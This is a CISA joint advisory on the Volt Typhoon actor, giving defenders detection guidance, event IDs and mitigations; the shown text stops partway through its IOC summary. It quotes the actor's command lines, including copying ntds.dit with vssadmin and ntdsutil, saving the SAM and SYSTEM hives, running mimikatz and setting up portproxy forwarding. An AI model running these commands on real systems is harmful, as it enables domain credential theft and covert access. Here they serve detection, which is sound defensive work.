{"markdown": "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n People's Republic of China State\\-Sponsored Cyber Actor Living off the Land to Evade Detection \\| CISA\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Skip to main content](#main) \n\n\n\n\n\n\n\n\n\n\n\n\n![U.S. flag](/profiles/cisad8_gov/themes/custom/gesso/dist/images/us_flag_small.png)\n\n\n\n An official website of the United States government\n \n\n\n\n Here\u2019s how you know\n \n\n\n\n\n\n Here\u2019s how you know\n \n\n\n\n\n\n\n![Dot gov](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-dot-gov.svg)\n\n\n**Official websites use .gov** \n  \n\n A\n **.gov** \n website belongs to an official government organization in the United States.\n \n\n\n\n\n\n![HTTPS](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-https.svg)\n\n\n**Secure .gov websites use HTTPS** \n  \n\n A\n **lock** \n (\n \n\n\n Lock\n \n\n A locked padlock\n \n\n\n\n\n ) or\n **https://** \n means you\u2019ve safely connected to the .gov website. Share sensitive information only on official, secure websites.\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools \"Free Cyber Services\") \n[\\#protect2024](/protect2024) \n[Secure Our World](/node/18883) \n[Shields Up](/node/8056) \n[Report A Cyber Issue](/node/16591) \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[![CISA Logo Americas Cyber Defense Agency](/sites/default/files/images/SVG/header_logo_tagline_update.svg)](/)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[![CISA Logo](/sites/default/files/images/SVG/mobile_logo_wordmark.svg)](/)\n\n\n\n\n\n\n\n\n\n\n Search\n \n\n\n\n\n\n\n\n\n\n Menu\n \n\n\n\n\n\n\n\n\n\n\n\n\n![America's Cyber Defense Agency](/sites/default/files/images/SVG/header_tagline_mobile_update.svg)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Close\n \n\n\n\n\n* Topics\n \n\n\n\n[Topics](/topics) \n\n\n\n\n[Cybersecurity Best Practices](/topics/cybersecurity-best-practices)\n\n\n\n\n[Cyber Threats and Advisories](/topics/cyber-threats-and-advisories)\n\n\n\n\n[Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience)\n\n\n\n\n[Election Security](/topics/election-security)\n\n\n\n\n[Emergency Communications](/topics/emergency-communications)\n\n\n\n\n[Industrial Control Systems](/topics/industrial-control-systems)\n\n\n\n\n[Information and Communications Technology Supply Chain Security](/topics/information-communications-technology-supply-chain-security)\n\n\n\n\n[Partnerships and Collaboration](/topics/partnerships-and-collaboration)\n\n\n\n\n[Physical Security](/topics/physical-security)\n\n\n\n\n[Risk Management](/topics/risk-management)\n\n\n\n\n\n[How can we help?](/audiences) \n\n\n[Government](/topics/government) \n[Educational Institutions](/topics/educational-institutions) \n[Industry](/topics/industry) \n[State, Local, Tribal, and Territorial](/topics/state-local-tribal-and-territorial) \n[Individuals and Families](/topics/individuals-and-families) \n[Small and Medium Businesses](/topics/small-and-medium-businesses) \n[Find Help Locally](/audiences/find-help-locally) \n[Faith\\-Based Community](/audiences/faith-based-community) \n[Executives](/audiences/executives) \n[High\\-Risk Communities](/audiences/high-risk-communities)\n* [Spotlight](/spotlight)\n* Resources \\& Tools\n \n\n\n\n[Resources \\& Tools](/resources-tools) \n\n\n\n\n[All Resources \\& Tools](/resources-tools/all-resources-tools)\n\n\n\n\n[Services](/resources-tools/services)\n\n\n\n\n[Programs](/resources-tools/programs)\n\n\n\n\n[Resources](/resources-tools/resources)\n\n\n\n\n[Training](/resources-tools/training)\n\n\n\n\n[Groups](/resources-tools/groups)\n* News \\& Events\n \n\n\n\n[News \\& Events](/news-events) \n\n\n\n\n[News](/news-events/news)\n\n\n\n\n[Events](/news-events/events)\n\n\n\n\n[Cybersecurity Alerts \\& Advisories](/news-events/cybersecurity-advisories)\n\n\n\n\n[Directives](/news-events/directives)\n\n\n\n\n[Request a CISA Speaker](/news-events/request-speaker)\n\n\n\n\n[Congressional Testimony](/news-events/congressional-testimony)\n\n\n\n\n[CISA Conferences](/cisa-conferences)\n\n\n\n\n[CISA Live!](/cisa-live)\n* Careers\n \n\n\n\n[Careers](/careers) \n\n\n\n\n[Benefits \\& Perks](/careers/benefits-perks)\n\n\n\n\n[HireVue Applicant Reasonable Accommodations Process](/careers/hirevue-applicant-reasonable-accommodations-process)\n\n\n\n\n[Hiring](/general-recruitment-and-hiring-faqs)\n\n\n\n\n[Resume \\& Application Tips](/careers/resume-application-tips)\n\n\n\n\n[Students \\& Recent Graduates](/students-recent-graduates-employment-opportunities)\n\n\n\n\n[Veteran and Military Spouses](/careers/veteran-and-military-spouse-employment-opportunities)\n\n\n\n\n[Work @ CISA](/careers/work-cisa)\n* About\n \n\n\n\n[About](/about) \n\n\n\n\n[Culture](/about/culture)\n\n\n\n\n[Divisions \\& Offices](/about/divisions-offices)\n\n\n\n\n[Regions](/about/regions)\n\n\n\n\n[Leadership](/about/leadership)\n\n\n\n\n[Doing Business with CISA](/doing-business-cisa)\n\n\n\n\n[Site Links](/site-links)\n\n\n\n\n[Reporting Employee and Contractor Misconduct](/reporting-employee-and-contractor-misconduct)\n\n\n\n\n[CISA GitHub](/cisa-github)\n\n\n\n\n[CISA Central](/cisa-central)\n\n\n\n\n[2023 Year In Review](/about/2023YIR)\n\n\n\n\n[Contact Us](/about/contact-us)\n\n\n\n\n\n\n\n\n\n[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools \"Free Cyber Services\") \n[\\#protect2024](/protect2024) \n[Secure Our World](/node/18883) \n[Shields Up](/node/8056) \n[Report A Cyber Issue](/node/16591) \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Breadcrumb\n \n1. [Home](/)\n2. [News \\& Events](/news-events)\n3. [Cybersecurity Advisories](/news-events/cybersecurity-advisories)\n4. [Cybersecurity Advisory](/news-events/cybersecurity-advisories?f%5B0%5D=advisory_type%3A94)\n\n\n\n\n\n\n\n\n Share:\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Cybersecurity Advisory\n \nPeople's Republic of China State\\-Sponsored Cyber Actor Living off the Land to Evade Detection\n==============================================================================================\n\n\n\n\n\n Release Date\n \n\n\n May 24, 2023\n \n\n\n\n\n Alert Code\n \n\n AA23\\-144A\n \n\n\n\n\n Related topics:\n \n\n[Cyber Threats and Advisories](/topics/cyber-threats-and-advisories) \n ,\n [Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience) \n\n\n\n\n\n\n\n\n\n\n\n\n\n### Summary\n\n\n\n The United States and international cybersecurity authorities are issuing this joint Cybersecurity Advisory (CSA) to highlight a recently discovered cluster of activity of interest associated with a People\u2019s Republic of China (PRC) state\\-sponsored cyber actor, also known as\n [Volt Typhoon](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/) \n . Private sector partners have identified that this activity affects networks across U.S. critical infrastructure sectors, and the authoring agencies believe the actor could apply the same techniques against these and other sectors worldwide.\n \n\n\n\n This advisory from the United States National Security Agency (NSA), the U.S. Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Federal Bureau of Investigation (FBI), the Australian Signals Directorate\u2019s Australian Cyber Security Centre (ACSC), the Communications Security Establishment\u2019s Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NCSC\\-NZ), and the United Kingdom National Cyber Security Centre (NCSC\\-UK) (hereafter referred to as the \u201cauthoring agencies\u201d) provides an overview of hunting guidance and associated best practices to detect this activity.\n \n\n\n\n One of the actor\u2019s primary tactics, techniques, and procedures (TTPs) is living off the land, which uses built\\-in network administration tools to perform their objectives. This TTP allows the actor to evade detection by blending in with normal Windows system and network activities, avoid endpoint detection and response (EDR) products that would alert on the introduction of third\\-party applications to the host, and\u00a0limit the amount of activity that is captured in default logging configurations. Some of the built\\-in tools this actor uses are:\n `wmic` \n ,\n `ntdsutil` \n ,\n `netsh` \n , and\n `PowerShell` \n . The advisory provides examples of the actor\u2019s commands along with detection signatures to aid network defenders in hunting for this activity. Many of the behavioral indicators included can also be legitimate system administration commands that appear in benign activity. Care should be taken not to assume that findings are malicious without further investigation or other indications of compromise.\n \n\n\n\n Download the\n [PDF version](https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_PRC_State_Sponsored_Cyber_Living_off_the_Land_v1.1.PDF) \n of this report (723 KB).\n \n\n\n\n Download the\n [Spanish version](/sites/default/files/2023-11/CSA_PRC_State_Sponsored_Cyber_Living_off_the_Land_v1.1_ES-US.pdf \"People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection - Spanish\") \n of this report (479\\.18 KB).\n \n\n\n\n For a downloadable copy of IOCs, see\n \n\n\n\n\n[People's Republic of China State\\-Sponsored Cyber Actor Living off the Land to Evade Detection](/sites/default/files/2023-05/aa23-144a.stix_.xml) \n\n (XML, 34\\.57 KB\n )\n \n\n\n\n\n[People's Republic of China State\\-Sponsored Cyber Actor Living off the Land to Evade Detection \\- Spanish](/sites/default/files/2023-11/CSA_PRC_State_Sponsored_Cyber_Living_off_the_Land_v1.1_ES-US.pdf) \n\n (PDF, 479\\.18 KB\n )\n \n\n\n\n For a downloadable copy of IOCs in JSON format, see\n [AA23\\-144A.stix.json](/sites/default/files/STIX/AA23-144A_PRC_State-Sponsored_Cyber_Actor_Living_Off_the_Land_to_Evade_Detection.stix.json) \n .\n \n\n\n### Technical Details\n\n\n\n This advisory uses the MITRE ATT\\&CK for Enterprise framework, version 13\\. See the Appendix: MITRE ATT\\&CK Techniques for all referenced tactics and techniques.\n \n\n\n### Background\n\n\n\n The authoring agencies are aware of recent People\u2019s Republic of China (PRC) state\\-sponsored cyber activity and have identified potential indicators associated with these techniques. This advisory will help net defenders hunt for this activity on their systems. It provides many network and host artifacts associated with the activity occurring after the network has been initially compromised, with a focus on command lines used by the cyber actor. An Indicators of compromise (IOCs) summary is included at the end of this advisory.\n \n\n\n\n Especially for living off the land techniques, it is possible that some command lines might appear on a system as the result of benign activity and would be false positive indicators of malicious activity. Defenders must evaluate matches to determine their significance, applying their knowledge of the system and baseline behavior. Additionally, if creating detection logic based on these commands, network defenders should account for variability in command string arguments, as items such as ports used may differ across environments.\n \n\n\n### Artifacts\n\n\n#### ***Network Artifacts***\n\n\n\n The actor has leveraged compromised small office/home office (SOHO) network devices as intermediate infrastructure to obscure their activity by having much of the command and control (C2\\) traffic emanate from local ISPs in the geographic area of the victim. Owners of SOHO devices should ensure that network management interfaces are not exposed to the Internet to avoid them being re\\-purposed as redirectors by malicious actors. If they must be exposed to the Internet, device owners and operators should ensure they follow zero trust principles and maintain the highest level of authentication and access controls possible.\n \n\n\n\n The actor has used Earthworm and a custom Fast Reverse Proxy (FRP) client with hardcoded C2 callbacks \\[\n [T1090](https://attack.mitre.org/versions/v13/techniques/T1090/) \n ] to ports 8080, 8443, 8043, 8000, and 10443 with various filenames including, but not limited to: cisco\\_up.exe, cl64\\.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe.\n \n\n\n#### ***Host Artifacts***\n\n\n#### Windows Management Instrumentation (WMI/WMIC)\n\n\n\n The actor has executed the following command to gather information about local drives \\[\n [T1082](https://attack.mitre.org/versions/v13/techniques/T1082/) \n ]:\n \n\n\n\n`cmd.exe /C \"wmic path win32_logicaldisk get caption,filesystem,freespace,size,volumename\"` \n\n\n\n\n This command does not require administrative credentials to return results. The command uses a command prompt \\[\n [T1059\\.003](https://attack.mitre.org/versions/v13/techniques/T1059/003/) \n ] to execute a Windows Management Instrumentation Command Line (WMIC) query, collecting information about the storage devices on the local host, including drive letter, file system (e.g., new technology file system \\[NTFS]), free space and drive size in bytes, and an optional volume name. Windows Management Instrumentation (WMI) is a built\\-in Windows tool that allows a user to access management information from hosts in an enterprise environment. The command line version of WMI is called WMIC.\n \n\n\n\n By default, WMI Tracing is not enabled, so the WMI commands being executed and the associated user might not be available. Additional information on WMI events and tracing can be found in the\n *References* \n section of the advisory.\n \n\n\n#### Ntds.dit Active Directory Database\n\n\n\n The actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive from Windows domain controllers (DCs) out of the network to perform password cracking \\[\n [T1003\\.003](https://attack.mitre.org/versions/v13/techniques/T1003/003/) \n ]. (The ntds.dit file is the main Active Directory (AD) database file and, by default, is stored at\n `%SystemRoot%\\NTDS\\ntds.dit` \n . This file contains information about users, groups, group memberships, and password hashes for all users in the domain; the SYSTEM registry hive contains the boot key that is used to encrypt information in the ntds.dit file.) Although the ntds.dit file is locked while in use by AD, a copy can be made by creating a Volume Shadow Copy and extracting the ntds.dit file from the Shadow Copy. The SYSTEM registry hive may also be obtained from the Shadow Copy. The following example commands show the actor creating a Shadow Copy and then extracting a copy of the ntds.dit file from it.\n \n\n\n\n`cmd /c vssadmin create shadow /for=C: > C:\\Windows\\Temp\\<filename>.tmp cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp > C:\\Windows\\Temp\\<filename>.tmp` \n\n\n\n\n The built\\-in Ntdsutil.exe tool performs all these actions using a single command. There are several ways to execute Ntdsutil.exe, including running from an elevated command prompt (cmd.exe), using WMI/WMIC, or PowerShell. Defenders should look for the execution of Ntdsutil.exe commands using long, short, or a combination of the notations. For example, the long notation command\n `activate instance ntds ifm` \n can also be executed using the short notation\n `ac i ntds i` \n . Table 1 provides the long and short forms of the arguments used in the sample Ntdsutil.exe command, along with a brief description of the arguments.\n \n\n\n\n\n\n Table 1: Ntdsutil.exe command syntax\n \n| **Long form** | **Short form** | **Description** |\n| --- | --- | --- |\n| activate instance % | ac i % | Sets variable % as the active instance for ntdsutil to use |\n| ifm | i | Install from media (ifm). Creates installation media to be used with DCPromo so the server will not need to copy data from another Domain Controller on the network |\n\n\n\n The actor has executed WMIC commands \\[\n [T1047](https://attack.mitre.org/versions/v13/techniques/T1047/) \n ] to create a copy of the ntds.dit file and SYSTEM registry hive using ntdsutil.exe. Each of the following actor commands is a standalone example; multiple examples are provided to show how syntax and file paths may differ per environment.\n \n\n\n\n`wmic process call create \"ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\pro` \n\n\n\n\n`wmic process call create \"cmd.exe /c ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\Pro\"` \n\n\n\n\n`wmic process call create \"cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\"` \n\n\n\n\n`\"cmd.exe\" /c wmic process call create \"cmd.exe /c mkdir C:\\windows\\Temp\\McAfee_Logs & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\McAfee_Logs\\\"` \n\n\n\n\n`cmd.exe /Q /c wmic process call create \"cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" 1> \\\\127.0.0.1\\ADMIN$\\ 2>&1` \n\n\n\n\n**Note:** \n The \\<timestamp value\\> would be an epoch timestamp following the format like \u201c\n `__1684956600.123456` \n \u201d.\n \n\n\n\n Each actor command above creates a copy of the ntds.dit database and the SYSTEM and SECURITY registry hives in the\n `C:\\Windows\\Temp\\<folder>` \n directory, where\n `<folder>` \n is replaced with the path specified in the command (e.g., pro, tmp, or McAfee\\_Logs). By default, the hidden\n `ADMIN$` \n share is mapped to\n `C:\\Windows\\` \n , so the last command will direct standard output and error messages from the command to a file within the folder specified.\n \n\n\n\n The actor has also saved the files directly to the\n `C:\\Windows\\Temp` \n and\n `C:\\Users\\Public` \n directories, so the entirety of those directory structures should be analyzed. Ntdsutil.exe creates two subfolders in the directory specified in the command: an Active Directory folder that contains the ntds.dit and ntds.jfm files, and a registry folder that contains the SYSTEM and SECURITY hives. Defenders should look for this folder structure across their network:\n \n\n\n\n`<path specified in command>\\Active Directory\\ntds.dit` \n\n\n\n\n`<path specified in command>\\Active Directory\\ntds.jfm` \n\n\n\n\n`<path specified in command>\\registry\\SECURITY` \n\n\n\n\n`<path specified in command>\\registry\\SYSTEM` \n\n\n\n\n When one of the example commands is executed, several successive log entries are created in the Application log, under the ESENT Source. Associated events can be viewed in Windows Event Viewer by navigating to:\n `Windows Logs | Application` \n . To narrow results to relevant events, select Filter Current Log from the Actions menu on the right side of the screen. In the Event sources dropdown, check the box next to ESENT, then limit the logs to ID numbers\n `216` \n ,\n `325` \n ,\n `326` \n , and\n `327` \n . Clicking the OK box will apply the filters to the results.\n \n\n\n\n Since ESENT logging is used extensively throughout Windows, defenders should focus on events that reference\n `ntds.dit` \n . If such events are present, the events\u2019 details should contain the file path where the file copies were created. Since these files can be deleted, or enhanced logging may not be configured on hosts, the file path can greatly aid in a hunt operation. Identifying the user associated with this activity is also a critical step in a hunt operation as other actions by the compromised\u2014or actor\\-created\u2014user account can be helpful to understand additional actor TTPs, as well as the breadth of the actor's actions.\n \n\n\n\n**Note:** \n If an actor can exfiltrate the ntds.dit and SYSTEM registry hive, the entire domain should be considered compromised, as the actor will generally be able to crack the password hashes for domain user accounts, create their own accounts, and/or join unauthorized systems to the domain. If this occurs, defenders should follow guidance for removing malicious actors from victim networks, such as CISA's\n [Eviction Guidance for Network Affected by the SolarWinds and Active Directory/M365 Compromise](https://www.cisa.gov/news-events/analysis-reports/ar21-134a) \n .\n \n\n\n\n In addition to the above TTPs used by the actor to copy the ntds.dit file, the following tools could be used by an actor to obtain the same information:\n \n\n\n* Secretsdump.py\n\t+ ***Note:** \n\t This script is a component of Impacket, which the actor has been known to use*\n* Invoke\\-NinjaCopy (PowerShell)\n* DSInternals (PowerShell)\n* FgDump\n* Metasploit\n\n\n\n Best practices for securing ntds.dit include hardening Domain Controllers and monitoring event logs for ntdsutil.exe and similar process creations. Additionally, any use of administrator privileges should be audited and validated to confirm the legitimacy of executed commands.\n \n\n\n#### PortProxy\n\n\n\n The actor has used the following commands to enable port forwarding \\[\n [T1090](https://attack.mitre.org/versions/v13/techniques/T1090/) \n ] on the host:\n \n\n\n\n`\"cmd.exe /c \"netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress= connectport=8443 protocol=tcp\"\"` \n\n\n\n\n`\"cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=\"` \n\n\n\n\n where\n `<rfc1918 internal ip address>` \n is replaced with an IPv4 address internal to the network, omitting the\n `< >` \n \u2019s.\n \n\n\n\n Netsh is a built\\-in Windows command line scripting utility that can display or modify the network settings of a host, including the Windows Firewall. The portproxy add command is used to create a host:port proxy that will forward incoming connections on the provided listenaddress and listenport to the connectaddress and connectport. Administrative privileges are required to execute the portproxy command. Each portproxy command above will create a registry key in the\n `HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp\\` \n path. Defenders should look for the presences of keys in this path and investigate any anomalous entries.\n \n\n\n\n**Note:** \n Using port proxies is not common for legitimate system administration since they can constitute a backdoor into the network that bypasses firewall policies. Administrators should limit port proxy usage within environments and only enable them for the period of time in which they are required.\n \n\n\n\n Defenders should also use unusual IP addresses and ports in the command lines or registry entries to identify other hosts that are potentially included in actor actions. All hosts on the network should be examined for new and unusual firewall and port forwarding rules, as well as IP addresses and ports specified by the actor. If network traffic or logging is available, defenders should attempt to identify what traffic was forwarded though the port proxies to aid in the hunt operation. As previously mentioned, identifying the associated user account that made the networking changes can also aid in the hunt operation.\n \n\n\n\n Firewall rule additions and changes can be viewed in Windows Event Viewer by navigating to:\n `Applications and Service Logs | Microsoft | Windows | Windows Firewall With Advanced Security | Firewall.` \n\n\n\n\n In addition to host\\-level changes, defenders should review perimeter firewall configurations for unauthorized changes and/or entries that may permit external connections to internal hosts. The actor is known to target perimeter devices in their operations. Firewall logs should be reviewed for any connections to systems on the ports listed in any portproxy commands discovered.\n \n\n\n#### PowerShell\n\n\n\n The actor has used the following PowerShell \\[\n [T1059\\.001](https://attack.mitre.org/versions/v13/techniques/T1059/001/) \n ] command to identify successful logons to the host \\[\n [T1033](https://attack.mitre.org/versions/v13/techniques/T1033/) \n ]:\n \n\n\n\n`Get-EventLog security -instanceid 4624` \n\n\n\n\n**Note:** \n Event ID 4624 is logged when a user successfully logs on to a host and contains useful information such as the logon type (e.g., interactive or networking), associated user and computer account names, and the logon time. Event ID 4624 entries can be viewed in Windows Event Viewer by navigating to:\n `Windows Logs | Security. PowerShell logs can be viewed in Event Viewer: Applications and Service Logs | Windows PowerShell` \n .\n \n\n\n\n This command identifies what user account they are currently leveraging to access the network, identify other users logged on to the host, or identify how their actions are being logged. If the actor is using a password spray technique \\[\n [T1110\\.003](https://attack.mitre.org/versions/v13/techniques/T1110/003/) \n ], there may be several failed logon (Event ID 4625\\) events for several different user accounts, followed by one or more successful logons (Event ID 4624\\) within a short period of time. This period may vary by actor but can range from a few seconds to a few minutes.\n \n\n\n\n If the actor is using brute force password attempts \\[\n [T1110](https://attack.mitre.org/versions/v13/techniques/T1110/) \n ] against a single user account, there may be several Event ID 4625 entries for that account, followed by a successful logon Event ID 4624\\. Defenders should also look for abnormal account activity, such as logons outside of normal working hours and impossible time\\-and\\-distance logons (e.g., a user logging on from two geographically separated locations at the same time).\n \n\n\n#### Impacket\n\n\n\n The actor regularly employs the use of Impacket\u2019s wmiexec, which redirects output to a file within the victim host's ADMIN$ share (\n `C:\\Windows\\` \n ) containing an epoch timestamp in its name. The following is an example of the \"\n `dir` \n \" command being executed by wmiexec.py:\n \n\n\n\n`cmd.exe /Q /c *dir 1> \\\\127.0.0.1\\ADMIN$\\__1684956600.123456 2>&1` \n\n\n\n\n**Note:** \n Discovery of an entry similar to the example above in the Windows Event Log and/or a file with a name in a similar format may be evidence of malicious activity and should be investigated further. In the event that only a filename is discovered, the epoch timestamp within the filename reflects the time of execution by default and can be used to help scope threat hunting activities.\n \n\n\n#### Enumeration of the Environment\n\n\n\n The following commands were used by the actor to enumerate the network topology \\[\n [T1016](https://attack.mitre.org/versions/v13/techniques/T1016/) \n ], the active directory structure \\[\n [T1069\\.002](https://attack.mitre.org/versions/v13/techniques/T1069/002/) \n ], and other information about the target environment \\[\n [T1069\\.001](https://attack.mitre.org/versions/v13/techniques/T1069/001/) \n ], \\[\n [T1082](https://attack.mitre.org/versions/v13/techniques/T1082/) \n ]:\n \n\n\n\n`arp -a` \n  \n\n`curl www.ip-api[.]com` \n  \n\n`dnscmd . /enumrecords /zone {REDACTED}` \n  \n\n`dnscmd . /enumzones` \n  \n\n`dnscmd /enumrecords {REDACTED} . /additional` \n  \n\n`ipconfig /all` \n  \n\n`ldifde.exe -f c:\\windows\\temp\\<filename>.txt -p subtree` \n  \n\n`net localgroup administrators` \n  \n\n`net group /dom net group \"Domain Admins\" /dom` \n  \n\n`netsh interface firewall show all` \n  \n\n`netsh interface portproxy show all` \n  \n\n`netsh interface portproxy show v4tov4` \n  \n\n`netsh firewall show all` \n  \n\n`netsh portproxy show v4tov4` \n  \n\n`netstat -ano` \n  \n\n`reg query hklm\\software\\` \n  \n\n`systeminfo` \n  \n\n`tasklist /v` \n  \n\n`whoami` \n  \n\n`wmic volume list brief` \n  \n\n`wmic service brief` \n  \n\n`wmic product list brief` \n  \n\n`wmic baseboard list full` \n  \n\n`wevtutil qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='{REDACTED}']] and EventData[Data='{REDACTED}']]` \n\n\n\n#### Additional Credential Theft\n\n\n\n The actor also used the following commands to identify additional opportunities for obtaining credentials in the environment \\[\n [T1555](https://attack.mitre.org/versions/v13/techniques/T1555/) \n ], \\[\n [T1003](https://attack.mitre.org/versions/v13/techniques/T1003/) \n ]:\n \n\n\n\n`dir C:\\Users\\{REDACTED}\\.ssh\\known_hosts` \n  \n\n`dir C:\\users\\{REDACTED}\\appdata\\roaming\\Mozilla\\firefox\\profiles` \n  \n\n`mimikatz.exe` \n  \n\n`reg query hklm\\software\\OpenSSH` \n  \n\n`reg query hklm\\software\\OpenSSH\\Agent` \n  \n\n`reg query hklm\\software\\realvnc` \n  \n\n`reg query hklm\\software\\realvnc\\vncserver` \n  \n\n`reg query hklm\\software\\realvnc\\Allusers` \n  \n\n`reg query hklm\\software\\realvnc\\Allusers\\vncserver` \n  \n\n`reg query hkcu\\software\\{REDACTED}\\putty\\session` \n  \n\n`reg save hklm\\sam ss.dat` \n  \n\n`reg save hklm\\system sy.dat` \n\n\n\n#### Additional Commands\n\n\n\n The actor executed the following additional commands:\n \n\n\n\n`7z.exe a -p {REDACTED} c:\\windows\\temp\\{REDACTED}.7z` \n  \n\n`C:\\Windows\\system32\\pcwrun.exe` \n  \n\n`C:\\Users\\Administrator\\Desktop\\Win.exe` \n  \n\n`C:\\Windows\\System32\\cmdbak.exe /c ping -n 1 127.0.0.1 > C:\\Windows\\temp\\putty.log C:\\Windows\\Temp\\tmp.log` \n  \n\n`\"cmd.exe\" /c dir \\\\127.0.0.1\\C$ /od` \n  \n\n`\"cmd.exe\" /c ping \u2013a \u2013n 1 <IP address>` \n  \n\n`\"cmd.exe\" /c wmic /user:<username> /password:<password> process call create \"net stop \\\"<service name>\\\" > C:\\Windows\\Temp\\tmp.log\"` \n  \n\n`cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1` \n  \n\n`net use \\\\127.0.0.1\\IPC$ /y /d` \n  \n\n`powershell start-process -filepath c:\\windows\\temp\\<filename>.bat -windowstyle Hidden` \n  \n\n`rar.exe a \u2013{REDACTED} c:\\Windows\\temp\\{REDACTED} D:\\{REDACTED}\\` \n  \n\n`wmic /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} cmd /c whoami` \n  \n\n`xcopy C:\\windows\\temp\\hp d:\\{REDACTED}` \n\n\n\n### Mitigations\n\n\n\n The authoring agencies recommend organizations implement the mitigations below to improve your organization\u2019s cybersecurity posture on the basis of the threat actor\u2019s activity. These mitigations align with the Cross\\-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity Frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA\u2019s\n [Cross\\-Sector Cybersecurity Performance Goals](https://www.cisa.gov/cpg) \n for more information on the CPGs, including additional recommended baseline protections.\n \n\n\n* Defenders should harden domain controllers and monitor event logs \\[\n [2\\.T](/resources-tools/resources/cpg-report) \n ] for ntdsutil.exe and similar process creations. Additionally, any use of administrator privileges should be audited and validated to confirm the legitimacy of executed commands.\n* Administrators should limit port proxy usage within environments and only enable them for the period of time in which they are required \\[\n [2\\.X](/resources-tools/resources/cpg-report) \n ].\n* Defenders should investigate unusual IP addresses and ports in command lines, registry entries, and firewall logs to identify other hosts that are potentially involved in actor actions.\n* In addition to host\\-level changes, defenders should review perimeter firewall configurations for unauthorized changes and/or entries that may permit external connections to internal hosts.\n* Defenders should also look for abnormal account activity, such as logons outside of normal working hours and impossible time\\-and\\-distance logons (e.g., a user logging on from two geographically separated locations at the same time).\n* Defenders should forward log files to a hardened centralized logging server, preferably on a segmented network \\[\n [2\\.F](/resources-tools/resources/cpg-report) \n ].\n\n\n### *Logging Recommendations*\n\n\n\n To be able to detect the activity described in this CSA, defenders should set the audit policy for Windows security logs to include \u201c\n `audit process creation` \n \u201d and \u201c\n `include command line in process creation events` \n \u201d in addition to accessing the logs. Otherwise, the default logging configurations may not contain the necessary information.\n \n\n\n\n Enabling these options will create Event ID 4688 entries in the Windows Security log to view command line processes. Given the cost and difficulty of logging and analyzing this kind of activity, if an organization must limit the requirements, they should focus on enabling this kind of logging on systems that are externally facing or perform authentication or authorization, especially including domain controllers.\n \n\n\n\n To hunt for the malicious WMI and PowerShell activity, defenders should also log WMI and PowerShell events. By default, WMI Tracing and deep PowerShell logging are not enabled, but they can be enabled by following the configuration instructions linked in the\n *References* \n section.\n \n\n\n\n The actor takes measures to hide their tracks, such as clearing logs \\[\n [T1070\\.001](https://attack.mitre.org/versions/v13/techniques/T1070/001/) \n ]. To ensure log integrity and availability, defenders should forward log files to a hardened centralized logging server, preferably on a segmented network. Such an architecture makes it harder for an actor to cover their tracks as evidence of their actions will be captured in multiple locations.\n \n\n\n\n Defenders should also monitor logs for Event ID 1102, which is generated when the audit log is cleared. All Event ID 1102 entries should be investigated as logs are generally not cleared and this is a known actor tactic to cover their tracks. Even if an event log is cleared on a host, if the logs are also stored on a logging server, the copy of the log will be preserved.\n \n\n\n\n This activity is often linked to malicious exploitation of edge devices and network management devices. Defenders should enable logging on their edge devices, to include system logs, to be able to identify potential exploitation and lateral movement. They should also enable network\\-level logging, such as sysmon, webserver, middleware, and network device logs.\n \n\n\n\n Indicators of Compromise (IOCs) Summary\n \n\n\n### Indicators of Compromise (IOCs) Summary\n\n\n#### ***TTPs***\n\n\n* Exploiting vulnerabilities \\[\n [T1190](https://attack.mitre.org/versions/v13/techniques/T1190/) \n ] in widely used software including, but not limited to:\n\t+ CVE\\-2021\\-40539\u2014ManageEngine ADSelfService Plus.\n\t\t- [APT Actors Exploiting Newly Identified Vulnerability in ManageEngine ADSelfService Plus](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-259a) \n\t\t .\n\t+ 